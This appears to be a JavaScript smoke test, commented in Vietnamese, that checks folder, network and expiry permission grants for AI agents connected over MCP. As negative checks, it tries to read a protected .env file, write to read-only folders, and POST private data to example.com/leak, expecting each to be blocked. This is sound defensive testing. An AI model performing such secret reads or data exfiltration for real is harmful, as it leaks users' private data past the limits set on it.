// Cấp quyền kiểu điện thoại: thư mục (chỉ đọc / đọc+ghi), mạng ra ngoài, hạn dùng.
//   node build/grant-smoke.mjs <granted|revoked> <url cửa trước> <token bot2> <url Telegram giả> <owner> <khoá cog> <đối số ssh…>
import { Client } from '../mcp/node_modules/@modelcontextprotocol/sdk/dist/esm/client/index.js';
import { StreamableHTTPClientTransport } from '../mcp/node_modules/@modelcontextprotocol/sdk/dist/esm/client/streamableHttp.js';
import { StdioClientTransport } from '../mcp/node_modules/@modelcontextprotocol/sdk/dist/esm/client/stdio.js';

const [phase, front, tokB, mock, owner, cogKey, ...ssh] = process.argv.slice(2);
const P = '/home/admin_1/projects';
let fail = 0;
const ok = (c, m) => { console.log(`  ${c ? '✓' : '✗'} ${m}`); if (!c) fail++; };
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const wrap = (c) => async (name, args = {}) => {
  try { const r = await c.callTool({ name, arguments: args }, undefined, { timeout: 120_000 }); return { err: !!r.isError, text: r.content[0].text }; }
  catch (e) { return { err: true, text: e.message }; }
};
const b = new Client({ name: 'bot2', version: '1' });
await b.connect(new StreamableHTTPClientTransport(new URL(front), { requestInit: { headers: { Authorization: `Bearer ${tokB}` } } }));
const B = wrap(b);
const c = new Client({ name: 'cog', version: '1' });
await c.connect(new StdioClientTransport({ command: 'ssh', args: ['-i', cogKey, ...ssh, 'axle', 'mcp'], stderr: 'ignore' }));
const C = wrap(c);

if (phase === 'granted') {
  // agent phụ: ~/projects/demo chỉ đọc, ~/projects/demo/data đọc + ghi, mạng 127.0.0.1
  ok((await B('file_read', { path: `${P}/demo/src/app.js` })).text.includes("console.log('demo')"), 'agent phụ đọc được thư mục được cấp');
  const ls = (await B('file_list', { path: `${P}/demo` })).text;
  ok(ls.includes('src/') && ls.includes('data/') && !ls.includes('.env'), `liệt kê được, file .env của chủ vẫn ẩn${ls.includes('src/') ? '' : ` [${ls.slice(0, 200)}]`}`);
  ok((await B('file_read', { path: `${P}/demo/.env` })).err, 'vẫn KHÔNG đọc được .env trong thư mục được cấp');
  ok((await B('file_write', { path: `${P}/demo/src/hack.js`, content: 'x', mode: 'overwrite' })).err, 'KHÔNG ghi được vào phần chỉ đọc');
  ok(!(await B('file_write', { path: `${P}/demo/data/out.txt`, content: 'ket qua cua bot2', mode: 'overwrite' })).err, 'ghi được vào phần được ghi');
  ok((await B('file_read', { path: `${P}/other/x.txt` })).err, 'KHÔNG đọc được thư mục không cấp (~/projects/other)');
  ok((await B('file_read', { path: `${P}/tam/t.txt` })).text.includes('tam thoi'), 'đọc được thư mục cấp có hạn (còn hạn)');

  // Lệnh xin duyệt chạy trong hộp cát có gắn đúng thư mục được cấp
  const p = B('run_command', { command: `ls ${P}; cat ${P}/demo/src/app.js; touch ${P}/demo/src/x 2>&1; true`, cwd: `${P}/demo`, waitSec: 60 });
  let m;
  for (let i = 0; i < 100 && !m; i++) {
    m = Object.entries((await (await fetch(`${mock}/_messages`)).json()).messages).find(([, x]) => x.text.includes(`ls ${P}`));
    if (!m) await sleep(200);
  }
  await fetch(`${mock}/_press`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ message_id: m[0], decision: 'a', from_id: Number(owner) }) });
  const out = (await p).text;
  ok(/\ndemo\n/.test(out) && !out.includes('other'), `trong hộp cát, ~/projects chỉ có đúng thư mục được cấp${/\ndemo\n/.test(out) ? '' : ` [${out.slice(0, 200)}]`}`);
  ok(out.includes("console.log('demo')") && /Read-only file system/.test(out), 'lệnh đọc được phần chỉ đọc, ghi vào thì hệ điều hành chặn (chỉ đọc)');

  // Mạng ra ngoài
  ok((await B('http_request', { url: 'http://127.0.0.1:8088/echo' })).text.startsWith('HTTP 200'), 'gọi được tên miền được cấp (127.0.0.1)');
  ok((await B('http_request', { url: 'http://localhost:8088/echo' })).text.startsWith('HTTP 200'), 'gọi được tên miền của khoá được dùng (localhost)');
  // https để qua được luật "http chỉ cho localhost" và tới đúng luật chặn mạng theo agent (chặn trước khi gửi, không cần mạng)
  const leak = (await B('http_request', { url: 'https://example.com/leak', method: 'POST', body: 'du lieu rieng' })).text;
  ok(leak.includes('chưa được gọi tới example.com'), `KHÔNG gọi được tên miền không cấp → vá đường rò dữ liệu${leak.includes('chưa được') ? '' : ` [${leak.slice(0, 150)}]`}`);

  // trợ lý chính: ghi được vào thư mục được cấp ghi, nơi khác thì không
  ok(!(await C('file_write', { path: `${P}/demo/src/cog.txt`, content: 'cog', mode: 'overwrite' })).err, 'trợ lý chính ghi được vào thư mục được cấp');
  ok((await C('file_write', { path: `${P}/other/cog.txt`, content: 'cog', mode: 'overwrite' })).err, 'trợ lý chính KHÔNG ghi ra ngoài vùng được cấp');
} else {
  ok((await B('file_read', { path: `${P}/demo/src/app.js` })).err, 'rút quyền ~/projects/demo → agent phụ không đọc được nữa');
  ok((await B('file_read', { path: `${P}/demo/data/out.txt` })).text.includes('ket qua cua bot2'), 'quyền ~/projects/demo/data (chưa rút) vẫn còn');
  ok((await B('file_read', { path: `${P}/tam/t.txt` })).err, 'quyền có hạn (20 giây) đã hết → tự bị rút');
  ok((await B('http_request', { url: 'http://127.0.0.1:8088/echo' })).text.includes('chưa được gọi tới 127.0.0.1'), 'rút quyền mạng → bị chặn lại');
  ok((await C('file_write', { path: `${P}/demo/src/cog2.txt`, content: 'x', mode: 'overwrite' })).err, 'rút quyền ghi của trợ lý chính → không ghi được nữa');
}

await b.close();
await c.close();
if (fail) { console.log(`✗ ${fail} mục hỏng`); process.exit(1); }
console.log(`✓ cấp quyền (${phase}) đạt`);
